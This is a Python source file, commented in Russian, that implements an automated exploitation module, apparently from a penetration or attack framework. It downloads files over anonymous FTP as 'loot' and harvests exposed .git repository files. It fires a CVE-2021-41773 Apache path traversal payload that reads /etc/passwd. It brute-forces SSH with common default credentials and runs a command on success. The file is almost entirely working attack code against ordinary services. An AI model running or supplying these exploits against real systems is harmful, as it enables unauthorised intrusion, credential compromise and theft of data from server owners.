import asyncio
import paramiko
from typing import List, Dict, Any
import subprocess
import requests

class Exploitation:
    def __init__(self, rate_limit: int = 1):
        self.rate_limit = rate_limit
        self.name = "exploitation"
        self.exploit_db = self.load_exploit_db()
    
    def load_exploit_db(self) -> Dict[str, Dict]:
        """База эксплойтов"""
        return {
            "anonymous_ftp": {
                "type": "ftp_loot",
                "description": "Поиск файлов через анонимный FTP",
                "risk": "low",
                "function": self.exploit_anonymous_ftp
            },
            "exposed_endpoint": {
                "type": "web_loot", 
                "description": "Анализ открытых endpoints",
                "risk": "medium",
                "function": self.exploit_exposed_endpoint
            },
            "CVE-2021-41773": {
                "type": "rce",
                "description": "Apache Path Traversal to RCE",
                "risk": "high", 
                "function": self.exploit_apache_traversal
            },
            "weak_ssh": {
                "type": "bruteforce",
                "description": "Bruteforce SSH с common credentials",
                "risk": "medium",
                "function": self.exploit_weak_ssh
            }
        }
    
    async def scan(self, vulnerabilities_data: Dict[str, Any]) -> Dict[str, Any]:
        results = {"exploitation_results": [], "module": self.name}
        
        for vuln in vulnerabilities_data:
            exploit_result = await self.attempt_exploitation(vuln)
            if exploit_result:
                results["exploitation_results"].append(exploit_result)
            
            await asyncio.sleep(1 / self.rate_limit)
        
        return results
    
    async def attempt_exploitation(self, vulnerability: Dict) -> Dict[str, Any]:
        """Попытка эксплуатации уязвимости"""
        vuln_type = vulnerability.get('type', '')
        exploit_info = self.exploit_db.get(vuln_type) or self.exploit_db.get(vulnerability.get('cve', ''))
        
        if not exploit_info:
            return None
        
        try:
            result = await exploit_info["function"](vulnerability)
            if result and result.get("success"):
                return {
                    **result,
                    "vulnerability": vulnerability,
                    "exploit_type": exploit_info["type"],
                    "risk": exploit_info["risk"]
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": vulnerability
            }
        
        return None
    
    async def exploit_anonymous_ftp(self, vulnerability: Dict) -> Dict[str, Any]:
        """Эксплуатация анонимного FTP"""
        service_info = vulnerability.get('service', {})
        host = service_info.get('host', '')
        port = service_info.get('port', 21)
        
        try:
            from ftplib import FTP
            ftp = FTP()
            ftp.connect(host, port, timeout=10)
            ftp.login('anonymous', 'anonymous@example.com')
            
            # Получаем список файлов
            files = []
            ftp.dir(files.append)
            
            # Пытаемся скачать небольшие файлы
            loot = []
            for file_info in files[:5]:  # Первые 5 файлов
                if file_info.startswith('-'):
                    filename = file_info.split()[-1]
                    if len(filename) < 50:  # Не слишком длинные имена
                        try:
                            with open(f"/tmp/{filename}", 'wb') as f:
                                ftp.retrbinary(f"RETR {filename}", f.write)
                            loot.append({
                                "type": "file",
                                "filename": filename,
                                "local_path": f"/tmp/{filename}"
                            })
                        except:
                            pass
            
            ftp.quit()
            
            return {
                "success": True,
                "loot": loot,
                "files_list": files,
                "access_type": "anonymous_ftp"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def exploit_exposed_endpoint(self, vulnerability: Dict) -> Dict[str, Any]:
        """Анализ открытых endpoints"""
        service_info = vulnerability.get('service', {})
        host = service_info.get('host', '')
        port = service_info.get('port', 80)
        endpoint = vulnerability.get('endpoint', '')
        
        try:
            protocol = "https" if port == 443 else "http"
            url = f"{protocol}://{host}:{port}{endpoint}"
            
            # Для .git endpoint пытаемся найти полезную информацию
            if ".git" in endpoint:
                return await self.analyze_git_endpoint(host, port, endpoint)
            
            # Для других endpoints просто проверяем доступ
            response = requests.get(url, timeout=10, verify=False)
            
            return {
                "success": True,
                "endpoint": endpoint,
                "status_code": response.status_code,
                "content_length": len(response.content),
                "access_type": "web_endpoint"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def analyze_git_endpoint(self, host: str, port: int, endpoint: str) -> Dict[str, Any]:
        """Анализ .git endpoint"""
        try:
            protocol = "https" if port == 443 else "http"
            base_url = f"{protocol}://{host}:{port}{endpoint}"
            
            # Проверяем наличие common git files
            git_files = ["HEAD", "config", "description", "index"]
            found_files = []
            
            for git_file in git_files:
                try:
                    url = f"{base_url}{git_file}"
                    response = requests.get(url, timeout=5, verify=False)
                    if response.status_code == 200:
                        found_files.append({
                            "file": git_file,
                            "content": response.text[:1000]  # Первые 1000 символов
                        })
                except:
                    continue
            
            return {
                "success": len(found_files) > 0,
                "found_git_files": found_files,
                "endpoint": endpoint,
                "access_type": "git_exposure"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def exploit_apache_traversal(self, vulnerability: Dict) -> Dict[str, Any]:
        """Эксплуатация CVE-2021-41773 (Apache Path Traversal)"""
        service_info = vulnerability.get('service', {})
        host = service_info.get('host', '')
        port = service_info.get('port', 80)
        
        try:
            protocol = "https" if port == 443 else "http"
            base_url = f"{protocol}://{host}:{port}"
            
            # Пытаемся прочитать /etc/passwd
            traversal_payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
            url = base_url + traversal_payload
            
            response = requests.get(url, timeout=10, verify=False)
            
            if response.status_code == 200 and "root:" in response.text:
                return {
                    "success": True,
                    "vulnerability": "CVE-2021-41773",
                    "loot": {
                        "file": "/etc/passwd",
                        "content": response.text
                    },
                    "access_type": "path_traversal"
                }
            else:
                return {"success": False, "reason": "Not vulnerable"}
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def exploit_weak_ssh(self, vulnerability: Dict) -> Dict[str, Any]:
        """Bruteforce SSH с common credentials"""
        service_info = vulnerability.get('service', {})
        host = service_info.get('host', '')
        port = service_info.get('port', 22)
        
        common_creds = [
            ("root", "root"),
            ("admin", "admin"),
            ("test", "test"),
            ("user", "user"),
            ("root", "password"),
            ("admin", "password")
        ]
        
        for username, password in common_creds:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=port, username=username, password=password, timeout=10)
                
                # Выполняем простую команду
                stdin, stdout, stderr = ssh.exec_command('id')
                output = stdout.read().decode()
                
                ssh.close()
                
                return {
                    "success": True,
                    "credentials": {
                        "username": username,
                        "password": password
                    },
                    "command_output": output,
                    "access_type": "ssh_access"
                }
                
            except:
                continue
            finally:
                try:
                    ssh.close()
                except:
                    pass
        
        return {"success": False, "reason": "No valid credentials found"}
